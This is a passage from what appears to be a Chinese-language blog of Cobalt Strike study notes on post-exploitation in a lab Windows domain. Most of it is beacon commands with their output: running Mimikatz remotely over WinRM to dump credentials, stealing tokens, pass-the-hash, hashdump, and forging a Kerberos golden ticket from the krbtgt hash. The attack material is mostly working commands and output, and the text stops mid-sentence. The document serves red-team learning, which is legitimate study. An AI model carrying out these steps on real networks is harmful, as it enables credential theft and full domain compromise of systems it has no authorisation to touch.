class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> WinDC <span class="literal">-ScriptBlock</span> &#123; net localgroup administrators&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> WinDC <span class="literal">-ScriptBlock</span> &#123; net localgroup administrators&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">303</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">别名     administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator</span><br><span class="line">Domain Admins</span><br><span class="line">Daniel</span><br><span class="line">Enterprise Admins</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 <code>winrm quickconfig</code>命令，输入 <code>y</code> 回车即可</p><p>命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统。</p><p><strong>通过 WinRM 运行 Mimikatz</strong></p><p>更进一步，甚至可以使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /path/to/<span class="built_in">Invoke-Mimikatz</span>.ps1</span><br><span class="line">powershell <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> TARGET</span><br></pre></td></tr></table></figure><blockquote><p>注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下，PowerSploit 项目下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/(opens new window)</a></p></blockquote><p>因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多，因此直接运行 <code>powershell-import</code> 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\path\<span class="built_in">Invoke-Mimikatz</span>.ps1</span><br></pre></td></tr></table></figure><p>上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">import-module</span> C:\<span class="built_in">Invoke-Mimikatz</span>.ps1</span><br></pre></td></tr></table></figure><p>最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> TARGET</span><br></pre></td></tr></table></figure><p>如果提示<code>无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……</code>，则可以将两条命令以分号合并在一起运行，即：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">import-module</span> C:\<span class="built_in">Invoke-Mimikatz</span>.ps1 ; <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> WinDC</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">import-module</span> C:\<span class="built_in">Invoke-Mimikatz</span>.ps1 ; <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">287</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot;</span></span><br><span class="line"> <span class="comment">## / \ ##  /* * *</span></span><br><span class="line"> <span class="comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>                                     with <span class="number">20</span> modules * * */</span><br><span class="line"></span><br><span class="line">mimikatz(powershell) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">314628</span> (<span class="number">00000000</span>:<span class="number">0004</span>cd04)</span><br><span class="line">Session           : Interactive from <span class="number">1</span></span><br><span class="line">User Name         : administrator</span><br><span class="line">Domain            : TEAMSSIX</span><br><span class="line">Logon Server      : WinDC</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">8</span>/<span class="number">20</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">08</span></span><br><span class="line">SID               : S<span class="literal">-1-5-22-3301978333-983314215-684642015-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line">……内容过多，余下部分省略……</span><br></pre></td></tr></table></figure><h6 id="获取信任"><a href="#获取信任" class="headerlink" title="获取信任"></a>获取信任</h6><p>如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的，其中会涉及到以下要点：</p><p>1、<code>Access Token</code> 登录令牌</p><p>2、<code>Credentials</code> 凭证</p><p>3、<code>Password Hashes</code> 密码哈希</p><p>4、<code>Kerberos Tickets</code> 登录凭据</p><p><strong>登录令牌</strong> </p><ul><li>登录令牌在登录之后被创建</li><li>与每个进程和线程相关联</li><li>包括：<ul><li>用户和用户组的信息</li><li>本地计算机上的特权列表</li><li>限制（删除用户和用户组的权限）</li><li>参考凭证（支持单点登录）</li></ul></li><li>一直保存在内存中，直到系统重启</li></ul><p><em>以下是令牌窃取的过程：</em></p><ul><li>使用 <code>ps</code> 列出进程</li><li>使用 <code>steal_token [pid]</code> 窃取令牌</li><li>使用 <code>getuid</code> 找到你是谁</li><li>使用 <code>rev2self</code> 移除令牌</li></ul><p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure><p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">ps</span></span><br><span class="line">[*] Tasked beacon to list processes</span><br><span class="line">[+] host called home, sent: <span class="number">12</span> bytes</span><br><span class="line">[*] <span class="keyword">Process</span> List</span><br><span class="line"> PID   PPID  Name                         Arch  Session     User</span><br><span class="line"> <span class="literal">---</span>   <span class="literal">----</span>  <span class="literal">----</span>                         <span class="literal">----</span>  <span class="literal">-------</span>     <span class="literal">-----</span></span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [<span class="type">System</span> <span class="type">Process</span>]                               </span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                       x64   <span class="number">0</span>           NT AUTHORITY\SYSTEM</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"> <span class="number">3720</span>  <span class="number">524</span>   taskhost.exe                 x64   <span class="number">2</span>           WIN<span class="literal">-72A8ERDSF2P</span>\Administrator</span><br><span class="line"> <span class="number">4092</span>  <span class="number">236</span>   dwm.exe                      x64   <span class="number">3</span>           TEAMSSIX\Administrator</span><br></pre></td></tr></table></figure><p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; steal_token <span class="number">4092</span></span><br><span class="line">[*] Tasked beacon to steal token from PID <span class="number">4092</span></span><br><span class="line">[+] host called home, sent: <span class="number">12</span> bytes</span><br><span class="line">[+] Impersonated TEAMSSIX\administrator</span><br></pre></td></tr></table></figure><p>查看一下当前会话 uid</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br><span class="line">[*] You are TEAMSSIX\administrator (admin)</span><br></pre></td></tr></table></figure><p>再次尝试获取域控制器主机下的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件      <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">4</span> 个目录 <span class="number">28</span>,<span class="number">493</span>,<span class="number">299</span>,<span class="number">712</span> 可用字节</span><br></pre></td></tr></table></figure><p>发现可以成功访问了，使用 <code>rev2self</code> 可移除当前窃取的令牌</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure><p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br><span class="line">[*] You are NT AUTHORITY\SYSTEM (admin)</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure><p><strong>凭证</strong> </p><p>1、使用 make_token 创建一个令牌</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token DOMAIN\user password</span><br></pre></td></tr></table></figure><p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍</p><p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; make_token TEAMSSIX\administrator Test111!</span><br><span class="line">[*] Tasked beacon to create a token <span class="keyword">for</span> TEAMSSIX\administrator</span><br><span class="line">[+] host called home, sent: <span class="number">53</span> bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件      <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">4</span> 个目录 <span class="number">28</span>,<span class="number">493</span>,<span class="number">299</span>,<span class="number">712</span> 可用字节</span><br><span class="line">               </span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WIN<span class="literal">-P2AASSD1AF1</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WIN<span class="literal">-P2AASSD1AF1</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">231</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">teamssix\administrator</span><br></pre></td></tr></table></figure><p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p><p>2、使用 spawn beacon 替代凭证</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawnas DOMAIN\user password</span><br></pre></td></tr></table></figure><p>3、在目标上建立账户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\host\C<span class="variable">$</span>/USER:DOMAIN\user password</span><br></pre></td></tr></table></figure><p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p><p><strong>密码哈希</strong> </p><p>使用 mimikatz 获取密码哈希</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth DOMAIN\user ntlmhash</span><br></pre></td></tr></table></figure><p>如何工作的？</p><p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p><p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p><p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: <span class="number">82501</span> bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:<span class="number">500</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Daniel:<span class="number">1000</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Guest:<span class="number">501</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TeamsSix:<span class="number">1002</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br></pre></td></tr></table></figure><p>使用 <code>pth</code> 获取信任</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; pth TEAMSSIX\Administrator <span class="number">12</span>cb161bvca930994x00cbc0aczf06d1</span><br><span class="line">[+] host called home, sent: <span class="number">23</span> bytes</span><br><span class="line">[*] Tasked beacon to run mimikatz<span class="string">&#x27;s sekurlsa::pth /user:Administrator /domain:TEAMSSIX /ntlm:12cb161bvca930994x00cbc0aczf06d1 /run:&quot;%COMSPEC% /c echo ade660d8dce &gt; \\.\pipe\8d3e4c&quot; command</span></span><br><span class="line"><span class="string">[+] host called home, sent: 750600 bytes</span></span><br><span class="line"><span class="string">[+] host called home, sent: 71 bytes</span></span><br><span class="line"><span class="string">[+] Impersonated NT AUTHORITY\SYSTEM</span></span><br><span class="line"><span class="string">[+] received output:</span></span><br><span class="line"><span class="string">user: Administrator</span></span><br><span class="line"><span class="string">domain: TEAMSSIX</span></span><br><span class="line"><span class="string">program: C:\Windows\system32\cmd.exe /c echo ade660d8dce &gt; \\.\pipe\8d3e4c</span></span><br><span class="line"><span class="string">impers.: no</span></span><br><span class="line"><span class="string">NTLM: 12cb161bvca930994x00cbc0aczf06d1</span></span><br><span class="line"><span class="string">  |  PID  2992</span></span><br><span class="line"><span class="string">  |  TID  5028</span></span><br><span class="line"><span class="string">  |  LSA Process is now R/W</span></span><br><span class="line"><span class="string">  |  LUID 0 ; 14812112 (00000000:00e203d0)</span></span><br><span class="line"><span class="string">  \_ msv1_0   - data copy @ 0000000001794E80 : OK !</span></span><br><span class="line"><span class="string">  \_ kerberos - data copy @ 000000000044A188</span></span><br><span class="line"><span class="string">   \_ aes256_hmac       -&gt; null             </span></span><br><span class="line"><span class="string">   \_ aes128_hmac       -&gt; null             </span></span><br><span class="line"><span class="string">   \_ rc4_hmac_nt       OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_old      OK</span></span><br><span class="line"><span class="string">   \_ rc4_md4           OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_nt_exp   OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_old_exp  OK</span></span><br><span class="line"><span class="string">   \_ *Password replace @ 00000000017DA1E8 (16) -&gt; null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">beacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;</span></span><br><span class="line"><span class="string">[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;</span></span><br><span class="line"><span class="string">[+] host called home, sent: 231 bytes</span></span><br><span class="line"><span class="string">[+] received output:</span></span><br><span class="line"><span class="string">teamssix\administrator</span></span><br></pre></td></tr></table></figure><h6 id="Kerberos-票据"><a href="#Kerberos-票据" class="headerlink" title="Kerberos 票据"></a>Kerberos 票据</h6><p>关于 Kerberos 的介绍： <a href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p><p>查看有哪些 Kerberos 票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><p>除去 kerberos 票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure><p>加载 kerberos 票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use [/<span class="type">path</span>/<span class="type">to</span>/<span class="type">file.ticket</span>]</span><br></pre></td></tr></table></figure><h6 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h6><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p><p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p><p><strong>1、目标的用户名及域名</strong></p><p><strong>2、域的 SID 值</strong></p><p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami /user</span><br><span class="line">[*] Tasked beacon to run: whoami /user</span><br><span class="line">[+] host called home, sent: <span class="number">43</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">用户信息</span><br><span class="line"><span class="literal">----------------</span></span><br><span class="line">用户名        SID                                         </span><br><span class="line">============= ============================================</span><br><span class="line">teamssix\daniel S<span class="literal">-1-5-21-5311978431-183514165-284342044-1000</span></span><br></pre></td></tr></table></figure><p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p><p><strong>3、DC 中 KRBTGT 用户的 NTLM 哈希</strong></p><p>DC 中 KRBTGT 用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: <span class="number">82501</span> bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:<span class="number">500</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Guest:<span class="number">501</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:<span class="number">502</span>:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::</span><br><span class="line">daniel:<span class="number">1108</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br></pre></td></tr></table></figure><p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面</p><p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式</p><p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WinDC <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WinDC <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">203</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">teamssix\administrator</span><br></pre></td></tr></table></figure><h6 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h6><p>实现代码执行的四个步骤：</p><p>1、与目标建立信任关系</p><p>2、复制可执行文件到目标上</p><p>3、在目标上运行可执行文件</p><p>4、实现对目标的控制</p><p>个人感觉其实这一节叫<code>横向移动的方法</code>更为合适</p><p><strong>创建可执行文件</strong></p><p>创建可执行文件可以在 Cobalt Strike 的 <code>Attack -&gt; Packages -&gt; 